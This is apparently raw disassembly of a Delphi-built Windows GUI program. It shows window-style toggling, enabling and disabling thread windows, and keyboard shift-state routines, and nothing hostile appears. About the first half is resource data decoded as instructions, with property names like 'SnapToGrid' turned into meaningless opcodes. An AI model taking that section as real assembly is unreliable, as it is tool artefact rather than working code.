inc [ eax ]
jg r-xdata
jle r-xdata
arpl [ edi + 0x6e ] bp
sbb [ esi + 0x44 ] dl
add [ ebp - 0x7a00fffe ] al
add al [ eax ]
dec ecx
imul ebp [ ebp + 0x6c ] 0x6000473d
insb
insb
push esi
inc esp
add [ ebx + eax ] dl
call [ ebx + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edx ] 0x0
add [ eax ] al
inc ebx
add [ edx ] cl
push ebx
outsb
popad
jo r-xdata
add [ eax + ebp * 4 + 0x47 ] bl
add [ eax - 0x80000000 ] al
adc al [ eax ]
or eax 0x74726556
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add [ eax + 0x48e0 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080042 ] al
push ebx
arpl [ ecx + 0x6c ] sp
sbb [ fs : esi + 0x44 ] dl
add [ eax + 0x3 ] dl
add bh bh
push eax
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
loopne r-xdata
arpl [ ecx + 0x6c ] sp
sbb [ gs : esi + 0x44 ] dl
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsd [ esi ]
inc edi
add [ eax + 0x47ad ] dl
push eax
inc edi
add [ eax ] bh
add eax [ eax ]
jmp eax
js r-xdata
je r-xdata
[ eax + ebp * 4 + 0x47 ]
add [ eax ] al
xor al 0x0
or cl [ ebx + 0x65 ]
jns r-xdata
add [ eax + ebp * 4 + 0x47 ] bl
add [ eax - 0x80000000 ] al
adc [ eax ] eax
or eax 0x7a726f48
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aaa
add [ esi ] cl
dec edi
add bh bh
add [ eax ] eax
stosd [ edi ]
inc edi
add [ ecx + eax + 0x7e00ff00 ] dh
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50070035 ] al
popad
imul ebp [ fs : esi + 0x67 ] r-xdata
mov al [ 0x8ff0002 ]
dec edi
outsb
inc ecx
insb
imul esp [ edi + 0x6e ] 0x65736e49
jb r-xdata
pop ss
inc esi
add [ edx + eax - 0x551f0100 ] ch
inc edi
add [ eax + ebp * 4 + 0x47 ] bl
add [ eax - 0x80000000 ] al
inc esi
add [ edx ] cl
push edi
push esi
inc esp
add [ eax ] cl
add bh bh
clc
aad 0x48
add ah al
xchg edx eax
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050005 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
add [ eax ] al
add [ eax + eax + 0x7 ] al
jne r-xdata
push esi
imul esi [ ebx + 0x69 ] 0x6c656c62
add [ edi ] al
push esi
inc esp
add [ edi ] dl
add bh bh
aam 0x95
inc edi
add [ eax ] bl
or [ ecx ] cl
add [ eax ] al
add [ eax ] al
inc esp
push eax
outsd
jae r-xdata
add [ eax ] cl
add [ eax - 0x3b00fffe ] cl
lodsd [ esi ]
inc edi
add [ eax + ebp * 4 + 0x47 ] bl
add [ eax + 0x2 ] al
add [ eax ] cl
dec esi
inc edi
push ebx
outsb
popad
jo r-xdata
outsd
outsb
or [ edi + 0x47 ] cl
add [ eax + 0x500b003d ] al
outsd
jo r-xdata
add [ eax ] al
insb
jae r-xdata
jo r-xdata
add [ eax ] 0x0
add [ eax + 0x5009003b ] al
outsd
insd
sbb [ esi + 0x44 ] dl
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
cmp [ eax ] eax
push cs
push eax
popad
jb r-xdata
insb
imul esp [ ebx + 0x6b ] r-xdata
loopne r-xdata
inc edx
outsw
jb r-xdata
imul ebp [ esi + 0x64 ] 0x654d776f
outsb
jne r-xdata
add [ eax + 0x570a0046 ] al
adc al 0x42
add al bl
add al [ eax ]
add [ edx ] 0x0
call [ edi + ebp * 4 - 0x5763ffb9 ]
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ 0x74646957 ] al
push r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp al 0x0
or [ eax + 0x6f ] edx
jo r-xdata
outsb
je r-xdata
loopne r-xdata
add bh bh
add [ eax ] al
or [ ecx ] 0x7
dec edi
outsb
inc ebx
movsb [ edi ] [ esi ]
inc ebp
add [ ebx ] cl
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
add [ ebx - 0x6b00fffe ] al
scasd [ edi ]
inc edi
add [ eax + ebp * 4 + 0x47 ] bl
add [ eax ] al
cmp eax 0x2640047
add bh bh
adc [ edi + 0x47 ] bh
inc esp
jo r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x6c65646f
push esi
inc esp
add [ ebp * 4 - 0x526fffb9 ] ch
inc edi
pushfd
test al 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07004a ] al
outsb
inc ebx
insb
outsd
jae r-xdata
add bh bh
dec edi
inc edi
outsd
add [ eax ] al
add [ eax - 0x80000000 ] al
dec ebp
add [ esi ] cl
fmul [ edi + 0x47 ]
add al ch
add al [ eax ]
add [ eax + 0x4f090050 ] al
js r-xdata
loopne r-xdata
jb r-xdata
add al dh
add al [ eax ]
push eax
add al [ eax ]
[ eax + ebp * 4 + 0x47 ]
add [ eax - 0x80000000 ] al
push ecx
add [ edi + ecx * 2 ] cl
outsb
inc esp
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
push eax
outsd
jo r-xdata
outsb
inc esp
jae r-xdata
push eax
add [ ecx ] cl
dec eax
add al bl
add [ eax ] al
jbe r-xdata
jns r-xdata
dec edi
in al 0x82
dec eax
add al ch
add [ eax ] eax
jo r-xdata
or [ edi + 0x6e ] ecx
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x6c ] bp
test [ eax ] cl
or [ edx ] al
add bh bh
or [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
jb r-xdata
dec edi
add [ eax ] al
adc [ eax ] 0x9
adc al 0x42
add [ eax ] 0x0
add [ eax + 0x4f0d0057 ] al
outsb
inc edi
je r-xdata
inc esp
jb r-xdata
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
push cs
adc al 0x42
add [ eax ] ah
add eax [ eax ]
jmp [ eax ]
add bh bh
pushfd
test al 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09005a ] al
outsb
dec ebx
jns r-xdata
imul esi [ ebp + 0x49 ] 0xf06f666e
adc al 0x42
add [ eax ] al
add eax [ eax ]
inc [ eax ]
add eax [ eax ]
[ eax + ebp * 4 + 0x47 ]
add bh bh
[ eax ] eax
outsb
inc esp
jb r-xdata
or [ eax ] 0xff0000d8
fadd [ eax ]
add bh bh
pushfd
test al 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0054 ] al
outsb
outsw
jo r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
push edi
add [ 0x65476e4f ] cl
je r-xdata
or [ eax ] 0xff0000e0
loopne r-xdata
cmp [ ecx ] al
add bh bh
cmp [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
jo r-xdata
popad
je r-xdata
sbb al 0x81
dec eax
add [ eax ] bl
add al [ eax ]
[ eax ]
add al [ eax ]
[ eax + ebp * 4 + 0x47 ]
add [ eax - 0x80000000 ] al
pop ebx
add [ edx ] cl
dec edi
outsb
dec ebx
jns r-xdata
add bh bh
pushfd
test al 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0055 ] al
outsb
inc esp
jb r-xdata
jae r-xdata
inc ebp
outsb
je r-xdata
add [ edi ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
or [ eax ] 0x28
add [ eax ] eax
[ eax ]
pushad
add [ edi + ecx * 2 ] cl
cmp al 0x7f
dec eax
add al al
add [ eax ] al
inc eax
add [ eax ] al
[ eax + ebp * 4 + 0x47 ]
add [ eax - 0x80000000 ] al
pop esi
add [ ebx ] cl
jb r-xdata
add [ eax - 0x80000000 ] al
add [ eax ] al
dec edi
jbe r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0065 ] al
push ebp
and [ edx ] 0x9
dec edi
outsb
jb r-xdata
dec ebp
outsd
jne r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
push 0xa86c6565
xchg [ eax ] cl
dec eax
add [ eax ] eax
dec [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ fs : eax ] dl
dec edi
dec esp
popad
jbe r-xdata
jae r-xdata
inc esp
outsd
ja r-xdata
dec edi
outsb
dec ebp
outsd
jne r-xdata
sbb [ esi ] 0xb
jae r-xdata
pop eax
add [ esi ] al
dec edi
outsb
dec eax
imul esp [ ebp + 0x5c ] 0xf8004750
add al [ eax ]
jb r-xdata
adc al 0x42
add [ eax ] bl
add eax [ eax ]
[ eax ]
add eax [ eax ]
[ eax + ebp * 4 + 0x47 ]
add [ eax - 0x80000000 ] al
imul eax [ eax ] 0x536e4f06
push 0x8448776f
dec eax
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b006a ] al
outsb
push ebx
je r-xdata
push edi
push 0x556c6565
jo r-xdata
push edi
xchg [ eax ] cl
inc eax
add [ eax ] eax
inc [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
arpl [ eax ] ax
or al 0x4f
outsd
jne r-xdata
jo r-xdata
push ebp
pop edi
add [ edi + ecx * 2 ] cl
outsb
dec ebp
outsd
jne r-xdata
outsb
adc al 0x42
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0060 ] al
jae r-xdata
push edi
outsb
dec ebp
outsd
jne r-xdata
dec edi
mov ah 0x7f
dec eax
add al cl
add [ eax ] al
dec eax
add [ eax ] al
[ eax + ebp * 4 + 0x47 ]
add [ eax - 0x80000000 ] al
popad
add [ ebx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
outsb
add [ eax + 0x4f100064 ] al
dec ebp
adc al 0x42
add [ eax ] bh
add [ eax ] eax
rol [ eax + 0x2200048 ] 0x1
add bh bh
and [ edx ] al
add bh bh
pushfd
test al 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07005c ] al
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
or [ eax ] 0xf8
add [ eax ] al
cld
jb r-xdata
outsb
dec ebp
push cs
dec edi
adc al 0x42
add [ eax ] cl
add eax [ eax ]
dec [ eax ]
add eax [ eax ]
[ eax + ebp * 4 + 0x47 ]
add [ eax - 0x80000000 ] al
add [ edi ] al
dec edi
outsb
push eax
popad
imul ebp [ esi + 0x74 ] r-xdata
call 0xffffffffe946648b
add [ eax ] al
[ eax + ebp * 4 + 0x47 ]
add [ eax - 0x80000000 ] al
add [ bx + si ] cl
dec edi
outsb
push edx
add [ edi ] al
je r-xdata
jpe r-xdata
and [ eax + 0x47 ] dl
add [ eax ] dl
add eax [ eax ]
call [ eax ]
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0068 ] al
outsb
push ebx
push 0x4374726f
jne r-xdata
test al 0x86
dec eax
add [ eax + 0x1 ] dl
add bh bh
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
push 0x446c6565
outsd
ja r-xdata
outsd
jbe r-xdata
dec ebp
dec ebp
outsd
jne r-xdata
adc [ edi + 0x6e ] cl
dec ebp
outsd
jne r-xdata
cmp al 0x7f
dec eax
add al dl
add [ eax ] al
call eax
add [ eax ] al
[ eax + ebp * 4 + 0x47 ]
add [ eax - 0x80000000 ] al
bound eax [ eax ]
or [ edi + 0x6e ] ecx
jo r-xdata
add [ eax + eax + 0x64 ] 0xb0004481
mov [ edi ] eax
pop esp
jne r-xdata
inc esp
jmp 0xffffffff879365b4
inc edi
add ah cl
inc di
outsd
arpl [ ebx - 0x24 ] bp
or [ eax ] 0x28
add al [ eax ]
[ eax ]
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
add al ah
add [ eax ] al
jmp eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0053 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
or [ eax ] 0xfffffff0
add [ eax ] eax
push eax
add [ eax ] eax
in al 0xce
dec eax
add [ esp + edx * 4 + 0xa540047 ] cl
dec ecx
add al al
in al 0x47
add [ eax - 0x23 ] ah
dec eax
add [ eax ] bl
ror [ eax ] 0x1
call 0xffffffff8847aed3
xchg esi eax
inc edi
add [ ebp + edx * 4 + 0x47 ] al
add [ eax ] al
dec eax
add [ edi + edx * 4 - 0x311fffb9 ] al
dec eax
add al bl
or cl [ ecx ]
nop
dec cx
add [ eax + 0x67 ] dl
dec ecx
add [ ecx + 0x67340049 ] dh
dec ecx
add [ eax - 0x63ffb87d ] cl
lahf
inc edi
add [ eax ] al
sub eax 0xb3f40049
inc edi
add [ ebx + edi * 4 + 0x47 ] bh
add [ eax - 0x67ffb847 ] al
sub eax 0x2dbc0049
dec ecx
add al bh
mov esp 0xbe2c0047
inc edi
add ah ch
sub ecx [ ecx ]
xchg esp eax
jge r-xdata
add [ eax ] dl
nop
inc edi
add al al
dec ebp
inc edx
add [ eax ] ah
out dx eax
inc edi
add [ esp + ecx * 4 + 0x47 ] al
add [ eax + 0x7800478d ] al
fisttp [ eax ]
adc al 0xea
inc edx
add [ edi + edx * 4 + 0x47 ] al
add [ eax ] dl
out 0x42 eax
add [ eax + ebp * 8 ] dl
inc edi
add [ ebp * 8 + 0x6f800047 ] dl
dec ecx
add [ ebp + esi * 2 + 0x74d80049 ] cl
dec ecx
add [ edi + ecx * 8 + 0x69b00048 ] bl
dec ecx
add [ eax + 0x3c004793 ] al
dec cx
add ah ah
into
inc esp
xchg edi eax
inc edi
add [ ebx + eax ] bh
add [ edx + edx * 2 + 0x47 ] dl
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add ah bh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x66cc0047 ] dl
inc edi
or [ eax ] eax
add [ eax + ebp * 2 + 0x49 ] bh
add [ ebp + eax * 8 + 0x47 ] ah
add [ eax ] cl
jge r-xdata
cmp [ eax - r-xdata ] esi
mov esp 0x47ef98ff
add al al
out dx eax
inc edi
add [ eax + esi * 8 - 0xdc3ffb9 ] ch
inc edi
add [ eax + esi * 8 + 0x47 ] dl
add [ edx + esi * 8 ] ah
inc edi
add [ ebp + ebp * 8 + 0x47 ] bh
add [ eax ] al
out dx eax
inc edi
add [ edi + ebp * 8 + 0x47 ] ch
add [ edi ] cl
push esp
inc ebx
jne r-xdata
add [ eax - 0x13ffb6cf ] dl
dec ecx
add [ eax + 0x7e ] bl
dec ecx
add [ edi + ebx * 8 + 0x7d680047 ] ah
inc edi
add [ eax ] bl
add [ edi ] 0x38
into
inc edi
add ah ah
mov al [ edi ]
pushad
mov eax [ edi ]
add al 0xe4
inc edi
add [ eax ] al
mov [ edi ] eax
mov dh bl
inc edi
add [ eax ] al
rol [ edi ] 0x7c
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ edi + 0x47 ] ah
add [ eax ] dl
add [ eax ] al
add al ah
push esi
je r-xdata
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
test [ eax ] al
mov eax [ 0xbb04200 ]
mov al 0x2c
mov al 0x39
mov al 0xc4
add [ esi + edx * 4 + 0x90047 ] al
add [ eax ] al
insd
inc esp
outsd
add [ eax ] al
add [ edi + 0x100047 ] al
add [ eax ] al
loopne r-xdata
loopne r-xdata
add [ esp + eax * 4 + 0x44 ] cl
add ah bh
jmp 0xffffffff84ab6810
add [ eax ] al
add [ eax ] al
sub ch [ eax + 0x47 ]
add [ eax + eax + 0x2cc00000 ] ch
inc edx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
inc esp
add [ edx + eax * 4 + 0x44 ] ch
inc edi
add [ edi ] al
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
add [ edx + eax * 4 + 0x44 ] dh
outsd
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax + 0x8004481 ] ah
push esp
dec ebp
outsd
outsb
inc esp
mov [ ebp + 0x47 ] fs
add [ ebp + edx * 2 + 0x140047 ] cl
add eax 0x6d726f46
jae r-xdata
insb
push esi
inc esp
add [ ebp * 4 - 0x526fffb9 ] ch
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d0013 ] al
imul edi [ eax + 0x65 ] 0x6550736c
jb r-xdata
add [ esi + edx * 2 + 0x44 ] ch
imul esi [ edi + ebp * 2 + 0x72 ] 0xe8909090
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
push 0x68380047
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] ch
push 0xac0047
add [ eax ] al
shr [ edx + eax * 2 ] 0x0
insb
add [ eax + eax + 0x74 ] 0x82
inc esp
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xa0004481
add [ eax + eax + 0x8 ] 0x6e6f4d54
outsb
arpl [ eax - 0x70 ] bp
test [ edi + 0x47 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_4769e4
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongW
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongW
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_476a30
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
push 0xffffffec
push esi
call GetWindowLongW
mov edi eax
test bl bl
je r-xdata
test bl bl
jne r-xdata
test edi 0x40000
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edi
and eax 0x40000
cmp eax 0x40000
jne r-xdata
push esi
call IsIconic
cmp eax 0x1
sbb eax eax
inc eax
mov [ esp + 0x2 ] al
push esi
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
mov [ esp + 0x1 ] al
movzx eax [ esp + 0x1 ]
or al [ esp + 0x2 ]
je r-xdata
test bl bl
je r-xdata
push 0x0
push esi
call ShowWindow
and edi 0xfffbffff
push edi
push 0xffffffec
push esi
call SetWindowLongW
or edi 0x40000
push edi
push 0xffffffec
push esi
call SetWindowLongW
jmp r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx eax [ esp ]
and al [ esp + 0x1 ]
jne r-xdata
push 0x5
push esi
call ShowWindow
push 0x6
push esi
call ShowWindow
jmp r-xdata
sub_476af4
mov eax [ rw-data ]
cmp [ eax + 0x170 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_482cc0
mov eax [ rw-data ]
call sub_42e534
mov eax [ rw-data ]
call sub_42e4d8
retn
xor edx edx
mov eax [ rw-data ]
call sub_481058
sub_476b30
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_44748c
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_476b80
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov ebx sub_476b30
xor eax eax
push ebp
push sub_476c32
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ rw-data ] 0x1
xor eax eax
push ebp
push sub_476bf4
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push ebx
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476c39
mov [ rw-data ] 0x0
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_476c44
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_4474a8
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_476c7c
push ebx
mov ebx eax
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
retn
mov eax [ rw-data ]
cmp ebx [ eax + 0x170 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongW
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_476cdc
push ebx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov ebx sub_476c7c
push 0x0
push ebx
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
pop ebx
retn
mov eax [ rw-data ]
pop ebx
retn
sub_476d3c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_476d5c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
or edi 0xffffffff
lea eax [ ebp - 0x4 ]
push eax
push ebx
call GetWindowThreadProcessId
cmp ebx [ esi ]
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call GetCurrentProcessId
cmp eax [ ebp - 0x4 ]
jne r-xdata
xor edi edi
mov [ esi + 0x4 ] 0x1
sub_476d94
push ebx
add esp 0xfffffff8
mov ebx eax
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
test bl bl
je r-xdata
mov eax esp
push eax
push sub_476d3c
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax esp
push eax
push sub_476d5c
call EnumWindows
jmp r-xdata
movzx eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_476dd8
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_47f684
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_47fbc4
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_434f0c
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_47f670
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_47fbb0
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_434f0c
test eax eax
je r-xdata
sub_476e90
push ebx
push esi
mov esi eax
movzx ebx [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_476ee8
push ebx
push esi
mov esi eax
movzx ebx [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_476f28
push ebx
push esi
mov esi eax
movzx ebx [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_476f74
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_476fd4
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_469090
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_449e98
mov eax [ ebp - 0x8 ]
mov cl 0x1
pop edx
call sub_435008
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476fdb
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_44936c
retn
sub_476fe4
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
test bl bl
jne r-xdata
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
jne r-xdata
mov esi [ esi + 0x30 ]
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
pop esi
pop ebx
retn
sub_477038
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi eax
xor eax eax
push ebp
push sub_4770a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_477028
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4770b0
lea eax [ ebp - 0xc ]
call j_sub_449348
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x11
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c88
call sub_448c38
sub_4770b8
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_448180
mov [ edi + 0x4 ] esi
movzx eax [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
